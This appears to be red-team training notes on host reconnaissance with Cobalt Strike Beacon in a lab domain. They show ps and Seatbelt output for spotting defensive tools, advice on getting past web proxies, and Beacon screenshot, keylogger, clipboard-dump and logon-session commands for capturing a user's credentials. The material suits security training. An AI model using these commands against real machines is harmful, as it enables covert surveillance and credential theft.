---
description: 09/03/2025
---

# Host Reconnaissance

## Introduction

Before we carry out any post-exploitation steps, it is critical to take a step back, and understand the current situation.&#x20;

:warning: EVERY ACTION THAT WE PERFORM CARRIES SOME RISK OF DETECTION.

That level of risk depends on our capabilities as well as the capabilities of any defenders (blue teamers).

We can enumerate the host for indicators of how well it is actively being protected and monitored.&#x20;

**This includes:**

* Antivirus (AV) solutions
* Endpoint Detection & Response (EDR) solution
* Windows audit policies
* PowerShell Logging
* Event Forwarding
* and so much more...&#x20;

## "Defense in Depth"

This is a concept by which multiple (independent) layers of security controls are placed throughout a system or environment.

* Think of this like an onion

If one defense was to fail, another would be right there to support it and take place to help further thwart the attack attempt. The intent is to provide a level of redundancy so in the event one fails, others remain. <mark style="color:yellow;">We must be prepared to bypass multiple layers of security</mark>.

## "Offense in Depth"

This is a similar concept for red teamers. The information gathered here should be used to shape actions that are carried out or the TTP's you choose to utilize during your engagements.

(e.g.) if you have a favored PowerShell script that performs a _**certain action**_ but PowerShell logging is enabled, you may need to **avoid** performing that _**certain action**_ in general. Or, you will need to find an alternative means of doing it, such as utilizing `.NET` instead of PowerShell.&#x20;

## Processes

On a host or communicating via job queue through a Beacon, _**we can list running processes on a system**_ using the <mark style="color:yellow;">`ps`</mark> command.

{% hint style="info" %}


:bulb:This can provide clues as to any custom applications or AV solutions that may be running.
{% endhint %}

### Example Output

```
beacon> ps

[*] This Beacon PID:    YELLOW 7480  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                                               
 88    4             Registry                                         
 364   4             smss.exe                                         
 1532  4             Memory Compression                               
 464   456   csrss.exe                                                
 540   532   csrss.exe                                                
 564   456   wininit.exe                                              
 680   564       services.exe                                         
 448   680           svchost.exe                                      
 2812  448               taskhostw.exe              x64   2           DEV\bfarmer
 4632  448               mmc.exe                                      
 4796  448               sihost.exe                 x64   2           DEV\bfarmer
 6048  448               taskhostw.exe              x64   2           DEV\bfarmer
 7896  448               powershell.exe             x64   2           DEV\bfarmer
 2252  7896                  conhost.exe            x64   2           DEV\bfarmer
 8088  7896                  powershell.exe         x64   2           DEV\bfarmer
 460   680           svchost.exe                                      
 1036  460               rdpclip.exe                x64   2           DEV\bfarmer
 756   680           svchost.exe                                      
 812   680           svchost.exe                                      
 820   680           svchost.exe                                      
 664   820               SearchApp.exe              x64   2           DEV\bfarmer
 3244  820               unsecapp.exe                                 
 3848  820               WmiPrvSE.exe                                 
 5408  820               RuntimeBroker.exe          x64   2           DEV\bfarmer
 6000  820               StartMenuExperienceHost.exe x64   2           DEV\bfarmer
 6068  820               RuntimeBroker.exe          x64   2           DEV\bfarmer
 6612  820               RuntimeBroker.exe          x64   2           DEV\bfarmer
 6672  820               smartscreen.exe            x64   2           DEV\bfarmer
 7172  820               TextInputHost.exe          x64   2           DEV\bfarmer
 7244  820               dllhost.exe                x64   2           DEV\bfarmer
 7744  820               PhoneExperienceHost.exe    x64   2           DEV\bfarmer
 8044  820               RuntimeBroker.exe          x64   2           DEV\bfarmer
 952   680           svchost.exe                                      
 1032  680           spoolsv.exe                                      
 1104  680           svchost.exe                                      
 5196  1104              ctfmon.exe                 x64   2           DEV\bfarmer
 1176  680           svchost.exe                                      
 1208  680           svchost.exe                                      
 1212  680           svchost.exe                                      
 1224  680           svchost.exe                                      
 1284  680           svchost.exe                                      
 1336  680           svchost.exe                                      
 1508  680           svchost.exe                                      
 1588  680           svchost.exe                                      
 1672  680           svchost.exe                                      
 1800  680           svchost.exe                                      
 1804  680           svchost.exe                                      
 1884  680           svchost.exe                                      
 2108  680           SgrmBroker.exe                                   
 2340  680           svchost.exe                                      
 2492  680           MsMpEng.exe                                      
 2500  680           Service 1.exe                                    
 2508  680           Service 3.exe                                    
 2588  680           VGAuthService.exe                                
 2640  680           Service 2.exe                                    
 2668  680           Sysmon64.exe                                     
 2740  680           elastic-endpoint.exe                             
 2748  680           elastic-agent.exe                                
 4356  2748              filebeat.exe                                 
 4404  4356                  conhost.exe                              
 3408  680           svchost.exe                                      
 3856  680           WUDFHost.exe                                     
 3924  680           svchost.exe                                      
 4544  680           svchost.exe                                      
 4548  680           SearchIndexer.exe                                
 4556  680           uhssvc.exe                                       
 4756  680           svchost.exe                                      
 4900  680           svchost.exe                    x64   2           DEV\bfarmer
 4996  680           svchost.exe                                      
 5696  680           svchost.exe                    x64   2           DEV\bfarmer
 6760  680           SecurityHealthService.exe                        
 700   564       lsass.exe                                            
 852   564       fontdrvhost.exe                                      
 636   532   winlogon.exe                                             
 8     636       dwm.exe                                              
 60    636       LogonUI.exe                                          
 856   636       fontdrvhost.exe                                      
 3896  1984  csrss.exe                                                
 4872  1984  winlogon.exe                                             
 3096  4872      dwm.exe                                              
 5040  4872      fontdrvhost.exe                                      
 5344  5300  explorer.exe                           x64   2           DEV\bfarmer
 6724  5344      SecurityHealthSystray.exe          x64   2           DEV\bfarmer
 6752  5344      vm3dservice.exe                    x64   2           DEV\bfarmer
 6868  5344      msedge.exe                         x64   2           DEV\bfarmer
 2756  6868          msedge.exe                     x64   2           DEV\bfarmer
 3256  6868          msedge.exe                     x64   2           DEV\bfarmer
 4644  6868          msedge.exe                     x64   2           DEV\bfarmer
 7040  6868          msedge.exe                     x64   2           DEV\bfarmer
 7480  5344      powershell.exe                     x64   2           DEV\bfarmer
 7488  7480          conhost.exe                    x64   2           DEV\bfarmer
```

#### Findings from output

We can see a few interesting processes that are running on the host:

* `Sysmon64`
* `MsMpEng`
* `elastic-endpoint`
* `elastic-agent`

{% hint style="warning" %}
When running in `medium` integrity (e.g. a standard user), you will _**not**_ be able to see arch, session, and user information for processes that your current user does not own.
{% endhint %}

The indentation represents parent/child relationships within the output (think of how Task Manager or Process Hacker displays information).

## Seatbelt

### What is it?

[Seatbelt ](https://github.com/GhostPack/Seatbelt)is a `C#` tool which automatically collects enumeration data for a host.

It can check for security configurations such as OS information, AV, AppLocker, LAPS, PowerShell Logging, audit policies, `.NET` versions, firewall rules, and more.

### Using Seatbelt

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

====== AppLocker ======

    [*] Applocker is not running because the AppIDSvc is not running

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.8.04084

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!

====== InternetSettings ======

  HKCU                       ProxyEnable : 1
  HKCU                     ProxyOverride : *.cyberbotic.io;<local>
  HKCU                       ProxyServer : squid.dev.cyberbotic.io:3128

====== LAPS ======

  LAPS Enabled                          : False

====== OSInfo ======

  Hostname                      :  wkstn-2
  Domain Name                   :  dev.cyberbotic.io
  Username                      :  DEV\bfarmer
  Build                         :  19044.1889
  BuildBranch                   :  vb_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator - UAC can be bypassed.
  TimeZone                      :  Coordinated Universal Time

====== PowerShell ======

  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.19041.1

====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 1
```

We can denote a few things from this output, but one thing to pay attention to is the _**web proxy**_ that is in place: `squid.dev.cyberbotic.io`.&#x20;

Why is this important you may ask? This has implications for HTTP(S) C2 for a variety of reasons.

## Web Categorization

Domain names are categorized by vendors so that they can be aggregated for filtering purposes. This is incredibly useful so that certain sites can be "categorized". For example, "gambling", "violence", "drugs", "social media", etc. can be blocked automatically.

#### Implications?

If the domain being used for part of your engagement ends up in a blocked category, it will be blacklisted, blocked access from every user, and effectively becomes useless.&#x20;

### Tackling This Issue

1. Obtain a domain that is in a desirable category
2. Requesting a change of category for a domain

Check out a tool called [Chameleon](https://github.com/mdsecactivebreach/Chameleon) to help automate the process.

## HTTPS Offloading

{% code overflow="wrap" %}
```
Web proxy -> Decrypts INCOMING HTTPS traffic -> Inspects cleartext HTTP -> re-encrypts with an internally signed and trusted public key -> sends to client
```
{% endcode %}

Some organizations (particularly those with an internal Public Key Infrastructure, or PKI) will perform Secure Sockets Layer (SSL) offloading on HTTPS web traffic.

This means that this allows the proxy to be able to decrypt incoming HTTPS traffic and inspect the plaintext HTTP. The traffic is then re-encrypted with an internally trusted private key before being forwarded to the client.

## Content Filtering & AV Scanning

```
Ability to scan for known, malicious content & block certain file types 
```

If a web proxy has the ability to read and inspect HTTP(S) traffic, then it also is capable of scanning for known malicious content.

This however, comes at a performance penalty.

Another common feature is to block the download and/or upload of particular file types, such as `.exe`, `.dll`, `.ps1`, etc. which may impact your ability to deliver payloads.&#x20;

## Authentication

Most organizations will require a form of authentication before a client is allowed to use a proxy.&#x20;

This could be anything from basic authentication within a local database, RADIUS, or Active Directory integration.

AD integration is very common and a popular choice amongst organizations as it provides Single Sign-On (SSO) via New Technology LAN Manager (NTLM), Kerberos, and Lightweight Directory Access Protocol/Secure (LDAP(S)).

This means that a principal must be in a "trusted" domain group before they can use the proxy, such Domain Users or a custom group entirely. This often excludes computer accounts, which means HTTP(S) Beacons running as local `SYSTEM` accounts cannot work.

## C2 Capability: Screenshots

Taking screenshots of the user's desktop can be useful to see what they are doing.

It can also show what systems or applications they're using, what shortcuts they have, what documents are open, what they're working on, and so on.

**Beacon has a few commands for taking screenshots in a few different ways:**

```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

#### Output

```
beacon> screenshot
[*] received screenshot of Sticky Notes from bfarmer (46kb)
```

**To view screenshots:**

**View -> Screenshots**

<figure><img src="../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

## C2 Capability: Keylogger

A keylogger is capable of capturing the keystrokes of a user, which is especially useful for capturing usernames, passwords, and other sensitive information.

{% hint style="warning" %}
Anything the user enters on the keyboard will be logged.
{% endhint %}

**Commands:**

```
beacon> keylogger
[+] received keystrokes from *Untitled - Notepad by bfarmer
```

Killing a keylogger requires the usage of the `jobkill` command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 6    0     keystroke logger

beacon> jobkill 6
```

## C2 Capability: Clipboard

The clipboard command will capture any text from the user's clipboard (it does not capture images or any other types of data).

This can be handy for capturing credentials that are being copy/pasted.

{% hint style="info" %}
This is incredibly useful in the event that _**password managers**_ are being used throughout the target environment.
{% endhint %}

**Usage:**

This is a one-off command (doesn't run as a job) and dumps the content directly to the Beacon console.

```
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (8 bytes):
Sup3rman
```

## C2 Capability: User Sessions

Users that are currently logged on to the same machine may be good targets to attack.

If they are more privileged than our current user on the domain, this may serve as a good candidate for lateral movement to other machines.

The _**Domain Reconnaissance**_ writeup will showcase some methods for performing this type of enumeration further.

The `net logons` command will list the _**logon sessions**_ that are currently active on this machine.

```
beacon> net logons

Logged on users at \\localhost:

DEV\bfarmer
DEV\jking
DEV\WKSTN-2$
```
